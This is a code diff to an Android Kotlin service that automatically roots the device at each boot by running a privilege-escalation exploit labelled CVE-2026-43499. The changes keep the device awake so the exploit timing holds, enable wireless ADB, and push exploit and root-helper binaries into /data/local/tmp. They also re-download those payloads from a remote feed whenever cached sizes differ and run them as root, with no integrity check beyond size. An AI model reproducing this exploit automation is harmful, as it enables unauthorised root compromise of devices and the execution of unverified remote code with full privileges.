@@ -9,6 +9,7 @@ import android.content.Intent
 import android.content.pm.ServiceInfo
 import android.os.Build
 import android.os.IBinder
+import android.os.PowerManager
 import androidx.core.app.NotificationCompat
 import java.io.File
 import kotlinx.coroutines.CoroutineScope
@@ -36,6 +37,11 @@ class RootOnBootService : Service() {
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        // Foreground contract first: a duplicate start while the pipeline is
+        // already running must still enter the foreground before returning,
+        // otherwise the system raises ForegroundServiceDidNotStartInTime and
+        // crashes the app in a loop (observed on alarm retries).
+        startInForeground()
         // Single-instance guard: BOOT_COMPLETED plus the alarm retries must
         // never run two pipelines concurrently - overlapping exploits,
         // late-loads or zygote kills destabilize the device (observed
@@ -44,7 +50,6 @@ class RootOnBootService : Service() {
             stopSelf()
             return START_NOT_STICKY
         }
-        startInForeground()
         scope.launch {
             val result = runCatching { runRootOnBoot() }
             val message = result.fold(
@@ -63,6 +68,24 @@ class RootOnBootService : Service() {
     }
 
     private fun runRootOnBoot() {
+        // The exploit choreography is timing-sensitive: a suspended SoC
+        // (screen off -> deep idle) desynchronizes it and burns attempts.
+        // Hold a partial wakelock for the whole pipeline and light the
+        // screen once ADB is up.
+        val powerManager = getSystemService(PowerManager::class.java)
+        val wakeLock = powerManager?.newWakeLock(
+            PowerManager.PARTIAL_WAKE_LOCK,
+            "rmg:RootOnBoot",
+        )
+        wakeLock?.acquire(PIPELINE_WAKELOCK_MS)
+        try {
+            runRootOnBootLocked()
+        } finally {
+            runCatching { if (wakeLock?.isHeld == true) wakeLock.release() }
+        }
+    }
+
+    private fun runRootOnBootLocked() {
         if (NativeProbe.isKernelSuActive()) {
             // Already rooted this boot (manual run or earlier retry): keep
             // the alarm retries harmless and report success immediately.
@@ -87,25 +110,54 @@ class RootOnBootService : Service() {
         // 1-3. Enable wireless debugging, discover port, connect (shared session).
         val adb = WirelessAdbSession.open(this)
 
+        // Wake the display: with the screen off the SoC can enter suspend
+        // between timing-critical exploit steps even under a partial
+        // wakelock (vendor idle governors are stricter than AOSP). Screen
+        // on + wakelock keeps the pipeline window stable.
+        runCatching { adb.shell("input keyevent KEYCODE_WAKEUP") }
+
         // 4. Resolve target and stage payloads
         running(getString(R.string.boot_stage_staging))
-        val profile = PayloadRepository(this).resolveTarget(DeviceSnapshot.current())
+        val repository = PayloadRepository(this)
+        val profile = repository.resolveTarget(DeviceSnapshot.current())
         val payloadDir = File(filesDir, "payloads/${profile.profileId}")
         val exploit = File(payloadDir, "cve-2026-43499-app.so")
         val rootHelper = File(payloadDir, "cve-2026-43499-root")
         // Cache file is named after the feed artifact since v0.2.8; fall back
         // to the legacy alias for caches written by older builds.
-        val ksudName = profile.kernelSu.url.substringAfterLast('/')
-        val ksud = sequenceOf(ksudName, LEGACY_KSUD_NAME)
-            .map { File(payloadDir, it) }
-            .firstOrNull { it.exists() } ?: File(payloadDir, ksudName)
+        fun ksudCandidates(): Sequence<File> = sequenceOf(
+            profile.kernelSu.url.substringAfterLast('/'),
+            LEGACY_KSUD_NAME,
+        ).map { File(payloadDir, it) }
+
+        // Refresh-on-boot: resolveTarget() already fetched the live manifest,
+        // so compare the cached artifacts against its expected sizes. A
+        // mismatch means a payload was updated upstream since the last run -
+        // re-download before staging so every boot executes the current
+        // build instead of whatever the cache happens to hold.
+        fun cacheComplete(): Boolean =
+            exploit.exists() && exploit.length() == profile.exploit.size &&
+                rootHelper.exists() && profile.rootHelper?.let { rootHelper.length() == it.size } == true &&
+                ksudCandidates().any { it.exists() && it.length() == profile.kernelSu.size }
+        if (!cacheComplete()) {
+            running(getString(R.string.boot_stage_staging), "refreshing payloads from feed")
+            val refreshed = runCatching { repository.download(profile) {} }
+            if (refreshed.isFailure && !exploit.exists()) {
+                check(false) {
+                    "Payload refresh failed and no cache exists for ${profile.profileId}: " +
+                        refreshed.exceptionOrNull()?.message
+                }
+            }
+        }
+        val ksud = ksudCandidates().firstOrNull { it.exists() }
+            ?: File(payloadDir, profile.kernelSu.url.substringAfterLast('/'))
         check(exploit.exists() && rootHelper.exists() && ksud.exists()) {
             "Cached payloads missing for ${profile.profileId} — run the exploit once from the app first"
         }
 
         val remoteExploit = "/data/local/tmp/f946b.so"
         val remoteHelper = "/data/local/tmp/cve-2026-43499-root"
-        val remoteKsud = "/data/local/tmp/$ksudName"
+        val remoteKsud = "/data/local/tmp/${ksud.name}"
         val remoteKsudStage = "/data/local/tmp/.ksud-stage"
 
         adb.push(exploit, remoteExploit, executable = true)
@@ -206,6 +258,16 @@ class RootOnBootService : Service() {
                 applied = true
                 break
             }
+            // Secondary signal: KernelSU live this boot means the exploit +
+            // late-load succeeded even if the done-marker was lost (e.g. an
+            // apply actor died before recording completion). Accept it after
+            // a grace period instead of reporting a false failure.
+            if (System.currentTimeMillis() - started > KSU_ACTIVE_GRACE_MS &&
+                NativeProbe.isKernelSuActive()
+            ) {
+                applied = true
+                break
+            }
             Thread.sleep(10_000)
         }
         adb.close()
@@ -283,6 +345,12 @@ class RootOnBootService : Service() {
         private const val MODULE_WAIT_MS = 300_000L
         private const val MAX_BOOT_RETRIES = 3
         private const val LEGACY_KSUD_NAME = "ksud-s25u-kdp"
+        /** Wait this long for a fresh done-marker before trusting the
+         * KernelSU-active probe as a success fallback. */
+        private const val KSU_ACTIVE_GRACE_MS = 120_000L
+        /** Upper bound for one full pipeline (connect + staging + exploit +
+         * late-load + module wait). */
+        private const val PIPELINE_WAKELOCK_MS = 20 * 60_000L
 
         @Volatile
         private var RUNNING = java.util.concurrent.atomic.AtomicBoolean(false)
